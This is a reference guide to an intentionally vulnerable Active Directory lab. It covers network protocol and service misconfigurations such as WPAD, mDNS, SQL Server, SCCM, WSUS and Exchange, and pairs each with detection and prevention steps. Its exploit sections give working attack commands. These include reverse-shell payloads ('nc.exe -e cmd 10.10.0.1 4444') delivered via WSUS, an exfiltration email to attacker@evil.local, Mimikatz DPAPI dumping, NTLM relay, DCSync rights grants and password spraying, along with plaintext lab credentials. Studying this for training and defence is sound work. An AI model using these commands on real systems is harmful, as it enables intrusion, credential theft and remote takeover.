# Network & Service Vulnerabilities Reference

This document covers the network protocol (`NET-` tags) and service-related (`SRV-` tags) vulnerability configurations in the EMPIRE AD Lab, detailing how they function, how to exploit them, and how to detect or prevent them.

---

## Network Protocol Misconfigurations (NET-001 .. NET-012)

### NET-001: WPAD Proxy Auto-Discovery via DNS
* **Explanation**: The DNS Server Global Query Block List (GQBL) is disabled on the Domain Controller (`coruscant.empire.local`), allowing resolution of the `wpad` hostname. Additionally, a static `wpad` A record is published pointing to the attacker's IP. When client browsers attempt to discover proxy settings, they request `http://wpad.empire.local/wpad.dat`, allowing the attacker to serve a malicious configuration file and capture NTLM credentials.
* **Exploit/Execution**:
  From the attacker box, verify resolution:
  ```bash
  nslookup wpad.empire.local
  ```
  Then host a rogue proxy auto-discovery file using Responder:
  ```bash
  sudo responder -I eth0 -wd
  ```
* **Detection & Prevention**:
  * *Detection*: Check the GQBL configuration in Active Directory DNS:
    ```powershell
    Get-DnsServerGlobalQueryBlockList
    ```
  * *Prevention*: Re-enable the Global Query Block List to block `wpad` and `isatap` resolution:
    ```powershell
    Set-DnsServerGlobalQueryBlockList -Enable $true
    ```
    Disable "Automatically detect settings" in browser LAN settings.

### NET-002: mDNS (UDP 5353) Enabled
* **Explanation**: Multicast DNS (mDNS) is left active on domain machines because the registry/GPO kill-switch is removed. When standard DNS query fails, Windows clients fall back to sending multicast DNS queries to local subnet address `224.0.0.251:5353`, enabling attackers to intercept and spoof name resolution responses.
* **Exploit/Execution**:
  Start Responder on the interface to spoof mDNS broadcasts:
  ```bash
  sudo responder -I eth0 -v
  ```
  Or scan for mDNS responders using Nmap:
  ```bash
  nmap -sU -p5353 --script dns-service-discovery 10.10.0.100
  ```
* **Detection & Prevention**:
  * *Detection*: Check if port 5353/UDP is open or if the `EnableMDNS` registry value is missing under `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters`.
  * *Prevention*: Disable mDNS globally via GPO or set the registry entry:
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableMDNS" -Value 0 -Type DWord
    ```

### NET-003: Insecure DNS Dynamic Updates
* **Explanation**: The DNS zone (`empire.local`) is configured to accept "Nonsecure and Secure" dynamic updates. This enables any computer on the segment to add or modify DNS records without authentication, allowing attackers to hijack existing hostname records or add records for spoofing (e.g. WPAD takeover).
* **Exploit/Execution**:
  Use the `nsupdate` utility to inject an A record:
  ```bash
  echo -e "server 10.10.0.10\nupdate add wpad.empire.local 86400 A 10.10.0.99\nsend" | nsupdate
  ```
* **Detection & Prevention**:
  * *Detection*: Review dynamic update settings for DNS zones using PowerShell:
    ```powershell
    Get-DnsServerZone -Name "empire.local" | Select-Object ZoneName, DynamicUpdate
    ```
  * *Prevention*: Restrict updates to secure-only (Kerberos-based) updates:
    ```powershell
    Set-DnsServerPrimaryZone -Name "empire.local" -DynamicUpdate Secure
    ```

### NET-004: TFTP Server Anonymous & Writable (UDP 69)
* **Explanation**: A TFTP (Trivial File Transfer Protocol) server is configured and running on `scarif.empire.local` (UDP port 69). It runs as a SYSTEM scheduled task and allows anonymous read and write operations inside the designated TFTP root directory, exposing the server to file exfiltration or malicious uploads.
* **Exploit/Execution**:
  Read or write files using a standard TFTP client:
  ```bash
  # Retrieve a file
  tftp 10.10.0.13 -c get README.txt
  # Upload a file
  tftp 10.10.0.13 -c put backdoor.exe
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor incoming connections on UDP port 69. Inspect active scheduled tasks for processes like `tftp-listener.ps1`.
  * *Prevention*: Stop and delete the TFTP listener task. Block UDP port 69 on the host firewall.

### NET-005: NetBIOS NodeType Forced to B-node
* **Explanation**: The NetBIOS over TCP/IP node type is set to Broadcast-node (B-node, value `1`). This forces the operating system to send name resolution queries as UDP 137 broadcasts over the local segment rather than using point-to-point query methods (such as WINS or local hosts), making clients highly susceptible to Responder poisoning.
* **Exploit/Execution**:
  Analyze network configuration on a workstation:
  ```cmd
  ipconfig /all
  ```
  Look for `Node Type . . . . . . . . . . . . : Broadcast` in the output.
* **Detection & Prevention**:
  * *Detection*: Verify if the `NodeType` value under `HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters` is set to `1`.
  * *Prevention*: Modify the node type to Hybrid (H-node, value `8`) or Peer-to-peer (P-node, value `2`) via DHCP Option 46 or local registry configuration:
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name "NodeType" -Value 8 -Type DWord
    ```

### NET-006: IPv6 Fully Enabled Segment-Wide
* **Explanation**: IPv6 is fully enabled on all hosts (`DisabledComponents` registry value set to `0`). Windows by default prioritizes IPv6 DNS resolution. An attacker can set up a rogue IPv6 DHCPv6 server and router on the L2 segment to assign their own IP as the primary DNS server, intercepting DNS queries and forcing NTLM authentication relay.
* **Exploit/Execution**:
  Start `mitm6` to spoof DNS settings for the domain:
  ```bash
  sudo mitm6 -i eth0 -d empire.local
  ```
  Then run `ntlmrelayx.py` to capture authentication attempts.
* **Detection & Prevention**:
  * *Detection*: Verify if `DisabledComponents` is set to `0` or missing under `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters`.
  * *Prevention*: Disable IPv6 on domain interfaces, or restrict rogue IPv6 advertisements using router guard configurations.

### NET-007: NTP Server (UDP 123) Enumeration
* **Explanation**: The Domain Controller runs the Windows Time service (`w32time`) as an NTP server on UDP port 123. Although `w32time` does not support the NTP `monlist` command (preventing NTP amplification attacks), the open UDP port allows attackers to perform reconnaissance and identify the Domain Controller.
* **Exploit/Execution**:
  Scan the DC using Nmap:
  ```bash
  nmap -sU -p123 --script ntp-info 10.10.0.10
  ```
* **Detection & Prevention**:
  * *Detection*: Check if the `NtpServer` provider is enabled under `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer`.
  * *Prevention*: Restrict access to NTP UDP port 123 to authorized subnets only using host-based firewalls.

### NET-008: SMTP Open Relay + VRFY/EXPN
* **Explanation**: An unauthenticated SMTP service runs on `scarif.empire.local` (TCP port 25). The service acts as an open relay (accepts external delivery addresses without credentials) and supports `VRFY` and `EXPN` commands, allowing attackers to expand distribution groups and enumerate valid Active Directory usernames.
* **Exploit/Execution**:
  Use `telnet` or `swaks` to test open relay and user verification:
  ```bash
  # Enumerate a user
  nc 10.10.0.13 25
  VRFY administrator
  
  # Relay an email
  swaks --server 10.10.0.13 --to external@gmail.com --from admin@empire.local --body "Test Relay"
  ```
* **Detection & Prevention**:
  * *Detection*: Review mail logs or test SMTP endpoints using Nmap scripts:
    ```bash
    nmap -p25 --script smtp-open-relay,smtp-enum-users 10.10.0.13
    ```
  * *Prevention*: Require SMTP authentication for relaying, limit delivery to local domains, and disable the `VRFY` and `EXPN` commands in the mail server configuration.

### NET-009: VNC (RFB) Server with No Authentication
* **Explanation**: A VNC (RFB) server runs on `tatooine.empire.local` (TCP port 5900) and advertises security type `1` (None). This allows remote users to establish interactive graphical sessions without entering a password.
* **Exploit/Execution**:
  Connect using a standard VNC viewer or scan with Nmap:
  ```bash
  nmap -p5900 --script vnc-info 10.10.0.100
  vncviewer 10.10.0.100::5900
  ```
* **Detection & Prevention**:
  * *Detection*: Identify services bound to TCP 5900 and verify handshake security types.
  * *Prevention*: Disable the VNC service, require strong password authentication (Security Type 2), and block port 5900 using host firewalls.

### NET-010: POP3 Cleartext Credentials
* **Explanation**: An unauthenticated POP3 service runs on `scarif.empire.local` (TCP port 110) and uses cleartext credentials (`USER`/`PASS`) without transport layer security (TLS). Attackers can sniff these credentials from the local network segment.
* **Exploit/Execution**:
  Perform password spraying/brute force using Hydra or connect manually:
  ```bash
  hydra -l mscott -P /usr/share/wordlists/rockyou.txt pop3://10.10.0.13
  
  # Manual connection
  nc 10.10.0.13 110
  USER mscott
  PASS SithLord1!
  ```
* **Detection & Prevention**:
  * *Detection*: Audit connections to TCP port 110; inspect logs for cleartext authentication attempts.
  * *Prevention*: Disable unencrypted POP3 access on port 110. Transition to POP3S (port 995) requiring SSL/TLS.

### NET-011: DHCP Starvation / Rogue DHCP
* **Explanation**: The lab network does not restrict DHCP lease allocation. An attacker can flood the network with DHCP requests (spoofing MAC addresses) to consume the pool of available IPs, then deploy a rogue DHCP server to assign malicious Gateway, DNS, or WPAD (Option 252) values to target machines.
* **Exploit/Execution**:
  Use `dhcpstarv` or `yersinia` to exhaust leases:
  ```bash
  sudo dhcpstarv -i eth0
  ```
  Then launch Responder with DHCP spoofing:
  ```bash
  sudo responder -I eth0 -d
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor the local network for rapid DHCP requests and multiple active DHCP offers.
  * *Prevention*: Enable DHCP Snooping and Port Security on managed switches to restrict DHCP server traffic to authorized ports.

### NET-012: ICMP / UDP / TCP Port Scanning Exposure
* **Explanation**: Host firewalls are completely disabled on lab virtual machines by default. All TCP and UDP service endpoints are fully exposed to network scans, permitting attackers to enumerate active services and map out target systems without evasion.
* **Exploit/Execution**:
  Perform full port scans using Nmap:
  ```bash
  nmap -sS -sU -p- 10.10.0.13
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor networks for sequential host and port sweep patterns.
  * *Prevention*: Enforce active host-based firewalls (Windows Defender Firewall) on all profiles and restrict traffic to necessary ports.

---

## Service-Specific Vulnerabilities (SRV-001 .. SRV-065)

### SQL Server (kamino.empire.local) (SRV-001 .. SRV-020)

#### SRV-001: SQL Server installed + accessible on 1433
* **Explanation**: SQL Server Express is installed on `kamino.empire.local` and configured to listen on default TCP port 1433, exposing the database management interface to the network.
* **Exploit/Execution**:
  Verify connectivity:
  ```bash
  nmap -p1433 10.10.0.14
  ```

#### SRV-002: sa account enabled with weak password
* **Explanation**: The default System Administrator (`sa`) database login is active and configured with a weak, easily guessable password (`DeathStar2025!`).
* **Exploit/Execution**:
  Connect using impacket:
  ```bash
  impacket-mssqlclient sa:DeathStar2025!@10.10.0.14
  ```

#### SRV-003: xp_cmdshell enabled
* **Explanation**: The extended stored procedure `xp_cmdshell` is enabled on the SQL Server. This allows any user with administrative or `sysadmin` role access to run arbitrary operating system shell commands.
* **Exploit/Execution**:
  ```sql
  xp_cmdshell 'whoami'
  ```

#### SRV-004: OLE Automation procedures enabled (sp_OACreate)
* **Explanation**: OLE Automation stored procedures (`sp_OACreate`, `sp_OAMethod`) are active, permitting attackers to interact with the underlying host OS and file system even if `xp_cmdshell` is disabled.
* **Exploit/Execution**:
  Execute OS commands using OLE Automation:
  ```sql
  DECLARE @shell INT;
  EXEC sp_OACreate 'WScript.Shell', @shell OUT;
  EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami';
  ```

#### SRV-005: Linked server with RPC out enabled
* **Explanation**: Linked servers are configured between SQL hosts with RPC (Remote Procedure Call) Out enabled, enabling command execution across remote servers.
* **Exploit/Execution**:
  Execute queries on linked server:
  ```sql
  EXEC ('xp_cmdshell ''whoami''') AT LINKED_SERVER;
  ```

#### SRV-006: SQL Server Browser service running
* **Explanation**: The SQL Server Browser service is running on UDP port 1434, disclosing information about database instances, ports, and pipe names.
* **Exploit/Execution**:
  ```bash
  nmap -sU -p1434 --script ms-sql-dac 10.10.0.14
  ```

#### SRV-007: Sysadmin role for domain user (svc_sql)
* **Explanation**: The Active Directory domain user account `svc_sql` has been assigned the high-privilege `sysadmin` server role in SQL Server, permitting full control of the database engine.
* **Exploit/Execution**:
  Connect to SQL using the `svc_sql` domain credentials:
  ```bash
  impacket-mssqlclient empire.local/svc_sql:SqlSvc2024!@10.10.0.14 -windows-auth
  ```

#### SRV-008: MSSQL xp_regread / xp_fileexist enabled
* **Explanation**: Procedures such as `xp_regread` (read registry entries) and `xp_fileexist` (check file system paths) are accessible, enabling directory mapping and registry extraction.
* **Exploit/Execution**:
  Check if a file exists:
  ```sql
  EXEC master..xp_fileexist 'C:\Windows\win.ini';
  ```

#### SRV-009: SQL Agent job with OS command execution
* **Explanation**: The SQL Server Agent service is configured with jobs utilizing the `CmdExec` subsystem, letting administrators execute OS command scripts via scheduled tasks.
* **Exploit/Execution**:
  Run a predefined backdoor job:
  ```sql
  EXEC msdb.dbo.sp_start_job 'Dunder_Backdoor_Job';
  ```

#### SRV-010: MSSQL weak password hash file exposed
* **Explanation**: Weak database login hashes are stored in the system catalog and can be extracted by any user with system view privileges for offline cracking.
* **Exploit/Execution**:
  Retrieve hashes:
  ```sql
  SELECT name, password_hash FROM sys.sql_logins;
  ```

#### SRV-011: CLR assembly execution enabled
* **Explanation**: Common Language Runtime (CLR) integration is active, permitting the loading of custom .NET assemblies that can execute arbitrary system code.
* **Exploit/Execution**:
  ```sql
  EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
  ALTER DATABASE master SET TRUSTWORTHY ON;
  -- Register and call custom assembly
  ```

#### SRV-012: MSSQL data directory world-readable
* **Explanation**: Database file directories containing `.mdf` and `.ldf` files are configured with permissive ACLs, allowing users to copy them and extract password hashes.
* **Exploit/Execution**:
  Copy the database files directly from disk:
  ```cmd
  copy C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\DunderMifflin.mdf C:\Temp\
  ```

#### SRV-013: Remote admin connections enabled (DAC)
* **Explanation**: Dedicated Administrator Connection (DAC) is enabled for remote administrative access over port 1434.
* **Exploit/Execution**:
  Connect using the DAC parameter:
  ```bash
  sqlcmd -S admin:10.10.0.14 -U sa -P DeathStar2025!
  ```

#### SRV-014: SQL Server audit disabled
* **Explanation**: Auditing configurations are disabled on the server, ensuring malicious activity, failed logins, and database alterations go unmonitored.
* **Exploit/Execution**:
  Verify audit state:
  ```sql
  SELECT * FROM sys.server_audits;
  ```

#### SRV-015: sp_configure accessible to public
* **Explanation**: The `sp_configure` configuration procedure allows standard public users to read server setting states.
* **Exploit/Execution**:
  ```sql
  EXEC sp_configure;
  ```

#### SRV-016: MSSQL pipes accessible without auth
* **Explanation**: Named pipe protocols are active, exposing named endpoints to remote access without authentication.
* **Exploit/Execution**:
  Connect using named pipes:
  ```cmd
  sqlcmd -S np:\\10.10.0.14\pipe\sql\query
  ```

#### SRV-017: Database mail profile (xp_sendmail)
* **Explanation**: Database Mail XPs are enabled, letting applications send email from the database, which can be abused for data exfiltration.
* **Exploit/Execution**:
  ```sql
  EXEC msdb.dbo.sp_send_dbmail @profile_name='Public', @recipients='attacker@evil.local', @subject='Exfil', @body='Credentials';
  ```

#### SRV-018: Impersonation chain: sa → svc_sql → sysadmin
* **Explanation**: Permissions are configured so that low-privilege users can impersonate other database logins.
* **Exploit/Execution**:
  Impersonate another user:
  ```sql
  EXECUTE AS LOGIN = 'sa';
  ```

#### SRV-019: Trustworthy database with EXECUTE AS OWNER
* **Explanation**: The `DunderMifflin` and `TrustDB` databases have the `TRUSTWORTHY` setting enabled. Users with `db_owner` permissions can escalate to `sa` (system administrator) status by executing stored procedures configured with the `EXECUTE AS OWNER` clause.
* **Exploit/Execution**:
  Call the escalation stored procedure:
  ```sql
  EXEC dbo.sp_escalate;
  ```

#### SRV-020: SQL Server error messages expose version/config
* **Explanation**: Custom error handling is off. Error responses return stack traces and configuration information.
* **Exploit/Execution**:
  Send invalid parameters to trigger a SQL syntax error.

---

### SCCM / System Center Configuration Manager (scarif.empire.local) (SRV-021 .. SRV-040)

#### SRV-021: SCCM client installed with NAA credentials
* **Explanation**: Network Access Account (NAA) credentials are cached in client machine WMI namespaces. Low-privilege users can retrieve and decrypt these credentials.
* **Exploit/Execution**:
  ```cmd
  SharpSCCM.exe get naa
  ```

#### SRV-022: SCCM admin service accessible (10122/tcp)
* **Explanation**: The administration service REST API is exposed over HTTP on port 10122, bypassing secure transport constraints.
* **Exploit/Execution**:
  ```bash
  curl http://scarif.empire.local:10122/AdminService/v1.0/
  ```

#### SRV-023: SCCM PXE enabled with no password
* **Explanation**: PXE boot configuration does not require a password, allowing attackers to request PXE boots and intercept task sequences containing credentials.
* **Exploit/Execution**:
  Use `pxethief.py`:
  ```bash
  python3 pxethief.py -i 10.10.0.0/21 -s scarif.empire.local
  ```

#### SRV-024: SCCM distribution point HTTP (no HTTPS)
* **Explanation**: Distribution points utilize unencrypted HTTP, exposing clients to code injection via MitM attacks during package downloads.
* **Exploit/Execution**:
  Intercept and modify HTTP package delivery payloads.

#### SRV-025: SCCM policy retrieval as domain user
* **Explanation**: Any domain user can poll policies from the Management Point, leaking configuration settings.
* **Exploit/Execution**:
  ```cmd
  SharpSCCM.exe get class-instances -n root\ccm\Policy\Machine
  ```

#### SRV-026: SCCM credential relay (NTLM relay via NAA trigger)
* **Explanation**: Attackers can register a rogue distribution point and trigger the SCCM site server to authenticate back to the attacker using NTLM, which can be relayed to escalate privileges.
* **Exploit/Execution**:
  ```bash
  sccmhunter smb -u luke.skywalker -p SithLord123! -d empire.local -dc-ip 10.10.0.10
  ```

#### SRV-027: SCCM site server admin override
* **Explanation**: Permissive administrative controls on the site server let local admins modify SCCM configurations.
* **Exploit/Execution**:
  Modify site settings using administrative access.

#### SRV-028: SCCM device collection with script deployment
* **Explanation**: Over-privileged script deployment controls enable administrators to execute arbitrary scripts on client hosts.
* **Exploit/Execution**:
  Run PowerShell scripts domain-wide using the SCCM deployment engine.

#### SRV-029: SCCM WMI namespace enumerable by domain users
* **Explanation**: The remote WMI namespaces are open to standard domain users.
* **Exploit/Execution**:
  ```powershell
  Get-WmiObject -Namespace root\SMS -Class SMS_Site
  ```

#### SRV-030: SCCM hierarchy admin account (svc_sccm) in domain admins
* **Explanation**: The SCCM service account (`svc_sccm`) is a member of the "Domain Admins" group, violating the principle of least privilege.
* **Exploit/Execution**:
  Verify group membership:
  ```cmd
  net user svc_sccm /domain
  ```

#### SRV-031: SCCM network access account in DPAPI master secret
* **Explanation**: Cached NAA credentials are encrypted using DPAPI master secrets, making them extractable by administrators.
* **Exploit/Execution**:
  Use Mimikatz to dump DPAPI secrets:
  ```cmd
  mimikatz# lsadump::dpapi /unprotect
  ```

#### SRV-032: SCCM task sequence with embedded credentials
* **Explanation**: Task sequences contain embedded local administrator or domain credentials in plaintext variables.
* **Exploit/Execution**:
  ```cmd
  SharpSCCM.exe get tasksequence
  sccmhunter tasksequence -u luke.skywalker -p SithLord123!
  ```

#### SRV-033: SCCM MP HTTP endpoint open
* **Explanation**: Management Point interfaces are exposed over HTTP port 80.
* **Exploit/Execution**:
  Connect to port 80 `/SMS_MP/.sms_aut`.

#### SRV-034..040: SCCM vector placeholders (Stubs)
* **Explanation**: Educational stubs representing future expansion of ConfigMgr attack vectors.
* **Exploit/Execution**:
  Perform network enumeration on SCCM endpoints.

---

### WSUS / Windows Server Update Services (scarif.empire.local) (SRV-041 .. SRV-055)

#### SRV-041: WSUS server HTTP endpoint (no HTTPS)
* **Explanation**: WSUS communicates with client hosts using unencrypted HTTP on port 8530, exposing clients to update hijacking via MitM attacks.
* **Exploit/Execution**:
  Intercept update requests using `PyWSUS`:
  ```bash
  python3 pywsus.py --host 10.10.0.13 --port 8530 --executable nc.exe --arguments "-e cmd 10.10.0.1 4444"
  ```

#### SRV-042: WSUS unauthenticated update metadata access
* **Explanation**: WSUS SOAP endpoints allow anonymous metadata retrieval.
* **Exploit/Execution**:
  Query WSUS web services:
  ```bash
  curl http://10.10.0.13:8530/ClientWebService/client.asmx
  ```

#### SRV-043: WSUS local admin injection
* **Explanation**: Attacker can use administrative credentials to approve malicious updates that execute as `SYSTEM` on target workstations.
* **Exploit/Execution**:
  Using `SharpWSUS`:
  ```cmd
  SharpWSUS.exe create /payload:"C:\Tools\nc.exe" /args:"-e cmd 10.10.0.1 4444" /title:"KB999999"
  SharpWSUS.exe approve /updateid:<ID> /computername:tatooine.empire.local /groupname:Targets
  ```

#### SRV-044: WSUS staging directory world-writable
* **Explanation**: The staging directory (`C:\WSUSContent\`) is world-writable, allowing low-privileged local users to replace update payloads.
* **Exploit/Execution**:
  Write payloads to `C:\WSUSContent`.

#### SRV-045: WSUS admin console accessible from workstations
* **Explanation**: WSUS console ports (8530/8531) are exposed to the workstation network segment.
* **Exploit/Execution**:
  Connect to administrative port 8530.

#### SRV-046: WSUS SPN registered for relay
* **Explanation**: SPNs are registered for WSUS hosts, allowing attackers to relay NTLM authentication to WSUS.
* **Exploit/Execution**:
  Verify SPN registration:
  ```cmd
  setspn -Q HTTP/wsus.empire.local
  ```

#### SRV-047: WSUS downstream server unauthorized approval
* **Explanation**: Lack of mutual authentication between upstream and downstream WSUS servers allows rogue synchronization.
* **Exploit/Execution**:
  Synch rogue updates to downstream servers.

#### SRV-048..055: WSUS vector placeholders (Stubs)
* **Explanation**: Educational stubs representing future expansion of WSUS attack vectors.
* **Exploit/Execution**:
  Perform network enumeration on WSUS endpoints.

---

### Exchange Server (coruscant.empire.local AD config) (SRV-056 .. SRV-065)

#### SRV-056: Exchange Windows Permissions group (WriteDACL)
* **Explanation**: The "Exchange Windows Permissions" group has `WriteDACL` rights on the domain object. A compromised group member can grant `DCSync` rights to any domain account.
* **Exploit/Execution**:
  ```powershell
  Add-DomainObjectAcl -TargetIdentity "DC=empire,DC=local" -PrincipalIdentity "svc_exchange" -Rights DCSync
  ```

#### SRV-057: Organization Management group (Exchange admin)
* **Explanation**: An administrative "Organization Management" group is created. Members have full Exchange admin permissions, allowing directory configurations.
* **Exploit/Execution**:
  Verify memberships:
  ```cmd
  net user mail_admin /domain
  ```

#### SRV-058: ProxyShell surface note (CVE-2021-34473/34523/31207)
* **Explanation**: Chained vulnerabilities (SSRF + ACL Bypass + Deserialization) allowing unauthenticated RCE on Microsoft Exchange.
* **Exploit/Execution**:
  ```bash
  python3 proxyshell.py -u https://mail.empire.local -e admin@empire.local
  ```

#### SRV-059: ProxyLogon surface note (CVE-2021-26855)
* **Explanation**: SSRF auth bypass vulnerability allowing attackers to execute commands when chained with CVE-2021-27065.
* **Exploit/Execution**:
  Scan target ECP paths for SSRF indicators.

#### SRV-060: CVE-2022-41082 ProxyNotShell note
* **Explanation**: SSRF chained with Remote PowerShell execution.
* **Exploit/Execution**:
  Send requests targeting EWS/PowerShell endpoints.

#### SRV-061: Exchange NTLM relay via EWS
* **Explanation**: EWS allows NTLM authentication, letting attackers relay coerced authentication.
* **Exploit/Execution**:
  ```bash
  ntlmrelayx.py --target ldap://coruscant.empire.local --escalate-user mail_admin
  ```

#### SRV-062: PrivExchange (CVE-2019-0686) NTLM coercion
* **Explanation**: Attackers can coerce Exchange computer accounts to authenticate back to the attacker using EWS push notification calls.
* **Exploit/Execution**:
  ```bash
  python3 privexchange.py -ah attacker_ip mail.empire.local -u mail_admin -p MailAdmin2024! -d empire.local
  ```

#### SRV-063: Exchange mailbox export privilege
* **Explanation**: The `svc_exchange` account is assigned mailbox export permissions, permitting offline email extraction.
* **Exploit/Execution**:
  Check Assignments:
  ```powershell
  Get-ManagementRoleAssignment -Role "Mailbox Import Export"
  ```

#### SRV-064: Autodiscover NTLM leak (CVE-2021-26414 pattern)
* **Explanation**: Autodiscover endpoints leak authentication hashes to proxy connections.
* **Exploit/Execution**:
  Sniff client autodiscover connections.

#### SRV-065: Exchange OWA brute force
* **Explanation**: The OWA login interface does not enforce account lockout, permitting password spraying.
* **Exploit/Execution**:
  ```bash
  spray.py -d empire.local -u users.txt -p 'SithLord123!' --proto owa --host mail.empire.local
  ```
